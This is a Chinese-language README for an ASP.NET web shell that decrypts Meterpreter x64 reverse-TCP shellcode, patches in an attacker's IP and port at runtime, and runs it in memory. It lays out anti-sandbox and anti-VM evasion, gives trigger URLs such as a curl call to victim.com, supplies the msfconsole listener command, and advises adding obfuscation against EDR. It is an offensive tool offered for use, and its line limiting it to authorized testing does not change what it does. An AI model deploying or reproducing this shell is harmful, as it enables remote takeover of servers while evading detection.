# met64swap.aspx

一个基于 [ASP.NET](https://asp.net/) 的 Meterpreter x64 TCP 反向 Shell Web Shell，支持在**不重新生成 Shellcode** 的情况下，**动态替换连接的 IP 地址和端口**。只需修改文件顶部的两个变量，或通过 GET 参数实时指定目标。

---

## 为什么需要它？

传统的 Web Shell 加载器通常将反弹地址硬编码在加密的 Shellcode 内部。
每次更换攻击机 IP 或监听端口时，都需要：

1. 重新用 `msfvenom` 生成 Shellcode
2. 对 Shellcode 进行加密（例如凯撒密码）
3. 将加密后的字节数组替换到脚本中

**`met64swap.aspx`**  **彻底简化了这个流程：**

- Shellcode 中预先放置了**占位符**（IP 为 `34.34.34.34`，端口为 `0x2222`）
- 运行时自动解密 Shellcode，并**动态替换**占位符为你指定的 IP 和端口
- 你只需要修改文件顶部的两个默认值，或者通过 GET 参数传入目标即可

---

## 工作原理（概述）

1. **加密负载**
   使用凯撒密码（字节值 -5）对 x64 Meterpreter TCP Shellcode 进行加密，其中 sockaddr 结构中的 IP 和端口已替换为特殊占位符。
2. **运行时动态注入**

   - 反沙箱检测（Sleep 加速判断）
   - 反虚拟化检测（NUMA 内存分配）
   - 解密 Shellcode
   - 搜索特征码 `02 00 22 22`（AF\_INET + 占位端口）定位占位符位置
   - 将真实 IP 和端口以**大端字节序**写入对应偏移处
3. **内存执行**
   使用 `VirtualAlloc` 申请可执行内存，复制 Shellcode，通过 `CreateThread` 执行，`WaitForSingleObject` 保持连接。

## 快速使用

### 1. 修改默认目标（最简单）

用任意文本编辑器打开 `met64swap.aspx`，找到最显眼的位置：

csharp

```
// ====== ★ 在这里修改你的 IP 和端口 ★ ======
string defaultIp   = "192.168.45.100";   // ← 修改为你的 IP
int    defaultPort = 4444;               // ← 修改为你的端口
```

修改后保存，上传到 IIS 服务器。

### 2. 触发执行

- **使用默认 IP/端口反弹**
  `http://<target>/met64swap.aspx?cmd=run`
- **使用自定义 IP/端口反弹（无需修改文件）** 
  `http://<target>/met64swap.aspx?ip=192.168.45.200&port=443`
- **直接访问**（无参数）
  页面不执行任何操作，静默返回空白，减少暴露风险。

### 3. 攻击机监听

在攻击机上启动 Meterpreter 监听（示例）：

bash

```
msfconsole
handler -H <你的IP> -P <你的端口> -p windows/x64/meterpreter/reverse_tcp
```

然后访问对应的 URL 即可获得会话。

## 参数说明

| 参数 | 必需                   | 说明                                 |
| ------ | ------------------------ | -------------------------------------- |
| `cmd=run`     | 否                     | 使用文件顶部定义的默认 IP 和端口执行 |
| `ip`     | 否（若指定则 `port` 也必需） | 目标 IP，格式如 `192.168.1.1`                     |
| `port`     | 否（若指定则 `ip` 也必需） | 目标端口，范围 1–65535              |

如果同时提供 `cmd=run` 和 `ip`/`port`，**`ip`** **/****`port`**  **优先级更高**（即自定义目标优先）。

## 安全对抗特性

- **反沙箱**：通过 `Sleep(5000)` 后检测实际流逝时间，若小于 4.5 秒则认为被加速执行，自动退出。
- **反虚拟化**：尝试使用 `VirtualAllocExNuma` 在 NUMA 节点 0 分配内存，多数虚拟机不支持 NUMA 且会返回 NULL，从而退出。
- **无文件落地**：Shellcode 全程在内存中执行，不接触磁盘。
- **参数化设计**：无参数时静默，降低自动化扫描的检测概率。

## 注意事项

- **仅限授权测试**：本工具仅供授权的安全评估和红蓝对抗使用，使用者需自行承担一切法律责任。
-  **.NET 环境**：目标服务器需支持 [ASP.NET](https://asp.net/)（.NET Framework 4.0+），通常为 IIS 7.0+。
- **信任级别**：服务器需允许非托管代码调用（`kernel32.dll`），多数默认配置可满足。
- **杀软/EDR**：本载荷未作免杀处理，建议在实际场景中结合混淆或自定义加密算法使用。
- **防火墙**：确保目标服务器能够出站连接到你的攻击机 IP 和端口。

bash

```

curl http://victim.com/met64swap.aspx?ip=10.0.0.10&port=9999
```
